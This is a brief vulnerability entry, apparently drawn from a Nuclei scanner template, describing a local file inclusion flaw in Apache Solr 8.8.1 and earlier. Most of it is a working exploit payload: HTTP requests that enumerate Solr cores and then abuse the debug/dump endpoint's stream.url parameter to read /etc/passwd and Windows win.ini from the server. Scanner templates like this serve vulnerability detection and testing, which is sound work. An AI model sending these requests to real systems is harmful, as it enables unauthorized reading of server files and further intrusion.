# Vulnerability: Apache Solr <=8.8.1 - Local File Inclusion
**Classification:** CWE-23,CWE-73
**Source:** Nuclei Template (`apache-solr-file-read.yaml`)

## Description
Apache Solr versions prior to and including 8.8.1 are vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /solr/admin/cores?wt=json HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/{{core}}/debug/dump?stream.url=file:///../../../../../Windows/win.ini&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close

GET /solr/{{core}}/debug/dump?stream.url=file:///etc/passwd&param=ContentStream HTTP/1.1
Host: {{Hostname}}
Accept-Language: en
Connection: close
```

